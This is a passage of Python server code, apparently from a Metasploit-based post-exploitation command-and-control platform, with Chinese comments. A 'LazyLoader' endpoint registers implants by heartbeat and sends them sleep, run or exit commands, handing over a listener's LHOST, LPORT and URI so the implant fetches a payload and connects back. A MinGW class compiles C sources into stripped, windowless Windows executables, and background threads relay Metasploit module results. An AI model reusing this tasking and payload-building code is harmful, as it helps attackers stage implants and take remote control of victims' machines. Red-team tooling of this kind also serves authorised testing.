                                (1024, "KB"),
                                ]:
            if size_in_bytes >= cutoff:
                return "%.1f %s" % (size_in_bytes * 1.0 / cutoff, label)

        if size_in_bytes == 1:
            return "1 B"
        else:
            bytes_str = "%.1f" % (size_in_bytes or 0,)
            return (bytes_str[:-2] if bytes_str.endswith('.0') else bytes_str) + ' B'

    @staticmethod
    def deal_path(path=None):
        """处理成linux路径"""
        tmppath = path.replace('\\\\', '/').replace('\\', '/')

        if re.match("^/[a-zA-Z]:/", tmppath) is not None:
            tmppath = tmppath[1:]

        # 只支持最后加/..和/../
        if tmppath.startswith('/'):  # linux路径
            if tmppath.endswith('/..') or tmppath.endswith('/../'):
                parts = PurePosixPath(tmppath).parent.parent.parts
                if len(parts) == 1:
                    tmppath = '/'
                elif len(parts) == 0:
                    tmppath = '/'
                else:
                    tmppath = "/".join(parts)

        else:
            if tmppath.endswith('/..') or tmppath.endswith('/../'):
                parts = PurePosixPath(tmppath).parent.parent.parts
                if len(parts) == 1:
                    tmppath = parts[0] + '/'
                elif len(parts) == 0:
                    tmppath = '/'
                else:
                    tmppath = "/".join(parts)

        tmppath = tmppath.replace('//', '/')
        if tmppath == '' or tmppath is None:
            logger.warning('输入错误字符')
            tmppath = '/'
        return tmppath


class ServiceStatus(object):
    """检查服务状态"""

    def __init__(self):
        pass

    @staticmethod
    def list():

        result = ServiceStatus.update_service_status()

        context = dict_data_return(200, CODE_MSG.get(200), result)
        return context

    @staticmethod
    def update_service_status():
        data = {
            'json_rpc': {'status': False},
        }

        # 检查msfrpc服务状态
        result = RpcClient.call(method=Method.CoreVersion, params=None, timeout=3)

        if result is None:
            data['json_rpc'] = {'status': False}
            logger.warning("json_rpc服务无法连接,请确认!")
        else:
            data['json_rpc'] = {'status': True}
        return data


class LazyLoader(object):
    """延迟控制metsrv加载"""

    def __init__(self):
        pass

    @staticmethod
    def list():
        data = Xcache.list_lazyloader()
        handlers = Handler.list_handler_config()
        context = dict_data_return(200, CODE_MSG.get(200), {"lazyloaders": data, "handlers": handlers})
        return context

    @staticmethod
    def source_code():

        filename = "lazyloader.zip"
        lazyloader_source_code_path = os.path.join(settings.BASE_DIR, STATIC_STORE_PATH, filename)
        byteresult = FileWrapper(open(lazyloader_source_code_path, 'rb'), blksize=1024)
        response = HttpResponse(byteresult)
        response['Content-Type'] = 'application/octet-stream'
        response['Code'] = 200
        response['Message'] = parse.quote(LazyLoader_MSG.get(203))
        # 中文特殊处理
        urlpart = parse.quote(os.path.splitext(filename)[0], 'utf-8')
        leftpart = os.path.splitext(filename)[-1]
        response['Content-Disposition'] = f"{urlpart}{leftpart}"

        return response

    @staticmethod
    def update(loader_uuid, field, data):
        if field == "payload":
            try:
                data = json.loads(data)
            except Exception as E:
                logger.warning(E)
                context = list_data_return(303, LazyLoader_MSG.get(303), [])
                return context

        lazyloader = Xcache.get_lazyloader_by_uuid(loader_uuid)
        if lazyloader is None:
            context = dict_data_return(304, LazyLoader_MSG.get(304), {})
            return context
        else:
            lazyloader[field] = data
            Xcache.set_lazyloader_by_uuid(loader_uuid, lazyloader)
            context = dict_data_return(201, LazyLoader_MSG.get(201), data)
            return context

    @staticmethod
    def destory(loader_uuid):
        data = Xcache.del_lazyloader_by_uuid(loader_uuid)
        context = dict_data_return(202, LazyLoader_MSG.get(202), data)
        return context

    @staticmethod
    def list_interface(req, loader_uuid, ipaddress):
        """loader 对外接口"""
        empty_lazyloader = {
            "uuid": None,
            "ipaddress": "127.0.0.1",
            "last_check": 0,
            "interval": 60,
            "payload": None,
            "send_payload": False,  # 是否向loader发送了payload
            "exit_loop": False,
        }
        sleep_cmd = "S"
        run_cmd = "R"
        exit_cmd = "E"
        null_cmd = "N"
        if loader_uuid is None:  # 首次请求
            if req == "u":
                loader_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
                context = f"{loader_uuid}"
            else:
                context = f"{null_cmd}"
            return context
        else:
            if len(loader_uuid) != 16:  # 检查uuid
                context = f"{null_cmd}"
                return context
            if req == "h":  # 心跳请求
                lazyloader = Xcache.get_lazyloader_by_uuid(loader_uuid)
                if lazyloader is None:  # 初始化数据
                    empty_lazyloader["uuid"] = loader_uuid
                    empty_lazyloader["ipaddress"] = ipaddress
                    empty_lazyloader["last_check"] = int(time.time())
                    Xcache.set_lazyloader_by_uuid(loader_uuid, empty_lazyloader)
                    context = f"{sleep_cmd}"
                    return context
                else:
                    if lazyloader.get("exit_loop") is True:  # 退出循环
                        Xcache.del_lazyloader_by_uuid(loader_uuid)
                        context = f"{exit_cmd}"
                        return context

                    new_interval = int(time.time()) - lazyloader.get("last_check")  # 获取新间隔
                    if new_interval < lazyloader["interval"]:
                        lazyloader["interval"] = new_interval

                    lazyloader["last_check"] = int(time.time())  # 更新最后心跳
                    lazyloader["ipaddress"] = ipaddress  # 更新对端地址

                    if lazyloader["payload"] is not None and lazyloader["send_payload"] is False:  # 发送payload
                        # 获取payload配置
                        payload = lazyloader.get("payload")
                        lhost = payload.get("LHOST")
                        lport = payload.get("LPORT")
                        luri = payload.get("LURI")

                        lazyloader["send_payload"] = True

                        context = f"{run_cmd}-{lhost}-{lport}-{luri}"
                    else:
                        context = f"{sleep_cmd}"
                    Xcache.set_lazyloader_by_uuid(loader_uuid, lazyloader)
                    return context
            else:
                context = f"{null_cmd}"
                return context


class Mingw(object):
    INCULDE_DIR = os.path.join(settings.BASE_DIR, STATIC_STORE_PATH, "mingw_header")
    CODE_TEMPLATE_DIR = os.path.join(settings.BASE_DIR, STATIC_STORE_PATH, "mingw_template")

    def __init__(self):
        self.mingw_bin = "x86_64-w64-mingw32-gcc"
        self.file_name = int(time.time())

        self.strip_syms = True
        self.link_script = None

    def build_cmd(self, src, arch="x64"):

        src_file = os.path.join(TMP_DIR, f"{self.file_name}.c")
        exe_file = os.path.join(TMP_DIR, f"{self.file_name}.exe")
        cmd = []
        with open(src_file, "wb") as f:
            f.write(src.encode("utf-8"))
        # 编译src
        if arch == "x64":
            cmd.append("x86_64-w64-mingw32-gcc")
        else:
            cmd.append("i686-w64-mingw32-gcc")

        cmd.append(src_file)
        # 头文件
        cmd.append("-I")
        cmd.append(self.INCULDE_DIR)
        # 输出文件
        cmd.append("-o")
        cmd.append(exe_file)

        # cmd.append("-nostdlib")

        # 其他参数
        cmd.append("-mwindows")
        cmd.append("-fno-ident")
        cmd.append("-ffunction-sections")

        opt_level = "-O2"
        cmd.append(opt_level)

        # linux独有参数
        if DEBUG:
            if self.strip_syms:
                cmd.append("-s")
        else:
            cmd.append("-fno-asynchronous-unwind-tables")
            link_options = '-Wl,' + '--no-seh,'
            if self.strip_syms:
                link_options += '-s'
            if self.link_script:
                link_options += f",-T{self.link_script}"
            cmd.append(link_options)
        return cmd

    def compile_c(self, src, arch="x64"):
        exe_file = os.path.join(TMP_DIR, f"{self.file_name}.exe")
        cmd = self.build_cmd(src, arch)
        ret = subprocess.run(cmd, capture_output=True, text=True)
        if ret.returncode != 0:
            logger.warning(ret.stdout)
            logger.warning(ret.stderr)
            return None
        try:
            with open(exe_file, 'rb') as f:
                data = f.read()
                return data
        except Exception as E:
            logger.exception(E)
            return None

    def cleanup_files(self):
        src_file = os.path.join(TMP_DIR, f"{self.file_name}.c")
        exe_file = os.path.join(TMP_DIR, f"{self.file_name}.exe")
        try:
            os.remove(src_file)
        except Exception as E:
            logger.exception(E)

        try:
            os.remove(exe_file)
        except Exception as E:
            logger.exception(E)


class MainMonitor(object):
    def __init__(self):
        self.MainScheduler = BackgroundScheduler()

    def start(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(("127.0.0.1", 47200))
        except socket.error:
            logger.warning("MainMonitor 已经启动,请勿重复启动")
            return
        # 获取缓存监听
        handler_list = Xcache.get_cache_handlers()

        # Xcache初始化部分
        Xcache.init_xcache_on_start()
        # 加载模块配置信息
        from PostModule.postmodule import PostModuleConfig
        PostModuleConfig.load_all_modules_config()

        # 关闭apscheduler的警告
        log = logging.getLogger('apscheduler.scheduler')
        log.setLevel(logging.ERROR)

        self.MainScheduler = BackgroundScheduler()

        # msf模块result数据监听线程
        self.MainScheduler.add_job(func=self.sub_msf_module_result_thread,
                                   max_instances=1,
                                   trigger='interval',
                                   seconds=1, id='sub_msf_module_result_thread')

        # msf模块data数据监听线程
        self.MainScheduler.add_job(func=self.sub_msf_module_data_thread,
                                   max_instances=1,
                                   trigger='interval',
                                   seconds=1, id='sub_msf_module_data_thread')

        # msf模块log数据监听线程
        self.MainScheduler.add_job(func=self.sub_msf_module_log_thread,
                                   max_instances=1,
                                   trigger='interval',
                                   seconds=1, id='sub_msf_module_log_thread')

        # 心跳线程
        self.MainScheduler.add_job(func=self.sub_heartbeat_thread,
                                   max_instances=1,
                                   trigger='interval',
                                   seconds=1, id='sub_heartbeat_thread')

        # send_sms线程
        self.MainScheduler.add_job(func=self.sub_send_sms_thread,
                                   max_instances=1,
                                   trigger='interval',
                                   seconds=1, id='sub_send_sms_thread')

        # bot 运行测试线程
        self.MainScheduler.add_job(func=self.run_bot_wait_list, max_instances=1,
                                   trigger='interval',
                                   seconds=1, id='run_bot_wait_list')
        # 恢复上次运行保存的监听
        self.MainScheduler.add_job(func=Handler.recovery_cache_last_handler,
                                   trigger='date',
                                   next_run_time=datetime.datetime.now() + datetime.timedelta(seconds=15),
                                   args=[handler_list],
                                   id='recovery_cache_last_handler')

        self.MainScheduler.start()

        logger.warning("后台服务启动成功")
        Notices.send_success(f"后台服务启动成功，15秒后开始加载历史监听.")

    @staticmethod
    def run_bot_wait_list():
        from PostModule.lib.ModuleTemplate import BROKER
        # 检查当前任务数量是否大于3个
        task_queue_length = Xcache.get_module_task_length()
        if task_queue_length >= 3:
            return

        req = Xcache.pop_one_from_bot_wait()
        if req is None:
            return

        broker = req.get("broker")
        module_intent = req.get("module")
        if broker == BROKER.bot_msf_job:
            # 放入后台运行队列
            MSFModule.putin_post_msf_module_queue(module_intent)
        else:
            logger.error("unknow broker")

    # @staticmethod
    # def sub_session_notify():
    #     header = [('Authorization', 'Bearer for_msf_token_as_password')]
    #
    #     async def hello():
    #         websocket = await websockets.connect('ws://192.168.146.130:55553/api/v1/websocket/notify',
    #                                              extra_headers=header)
    #         name = input("What's your name? ")
    #
    #         await websocket.send(name)
    #         print(f"> {name}")
    #
    #         greeting = await websocket.recv()
    #         print(f"< {greeting}")
    #
    #         async for message in websocket:
    #             print(message)
    #
    #     new_loop = asyncio.new_event_loop()
    #     asyncio.set_event_loop(new_loop)
    #     new_loop.run_until_complete(hello())

    @staticmethod
    def sub_heartbeat_thread():
        channel_layer = get_channel_layer()
        from WebSocket.websocket import HeartBeat
        result = HeartBeat.get_heartbeat_result()
        async_to_sync(channel_layer.group_send)(
            "heartbeat",
            {
                'type': 'send.message',
                'message': result
            }
        )

    @staticmethod
    def sub_send_sms_thread():
        """这个函数必须以线程的方式运行,监控msf发送的redis消息,获取job类任务推送的数据"""

        rcon = RedisClient.get_result_connection()
        if rcon is None:
            return
        ps = rcon.pubsub(ignore_subscribe_messages=True)
        ps.subscribe(**{VIPER_SEND_SMS_CHANNEL: Notices._send_bot_msg})
        for message in ps.listen():
            if message:
                logger.warning("不应获取非空message {}".format(message))

    @staticmethod
    def sub_msf_module_result_thread():
        """这个函数必须以线程的方式运行,监控msf发送的redis消息,获取job类任务推送的结果"""
        rcon = RedisClient.get_result_connection()
        if rcon is None:
            return
        ps = rcon.pubsub(ignore_subscribe_messages=True)
        ps.subscribe(**{MSF_RPC_RESULT_CHANNEL: MSFModule.store_result_from_sub})
        for message in ps.listen():
            if message:
                logger.warning("不应获取非空message {}".format(message))

    @staticmethod
    def sub_msf_module_data_thread():
        """这个函数必须以线程的方式运行,监控msf发送的redis消息,获取job类任务推送的数据"""
        rcon = RedisClient.get_result_connection()
        if rcon is None:
            return
        ps = rcon.pubsub(ignore_subscribe_messages=True)
        ps.subscribe(**{MSF_RPC_DATA_CHANNEL: MSFModule.store_monitor_from_sub})
        for message in ps.listen():
            if message:
                logger.warning("不应获取非空message {}".format(message))

    @staticmethod
    def sub_msf_module_log_thread():
        """这个函数必须以线程的方式运行,监控msf发送的redis消息,获取job类任务推送的消息"""
        rcon = RedisClient.get_result_connection()
        if rcon is None:
            return
        ps = rcon.pubsub(ignore_subscribe_messages=True)
        ps.subscribe(**{MSF_RPC_LOG_CHANNEL: MSFModule.store_log_from_sub})
        for message in ps.listen():
            if message:
                logger.warning("不应获取非空message {}".format(message))
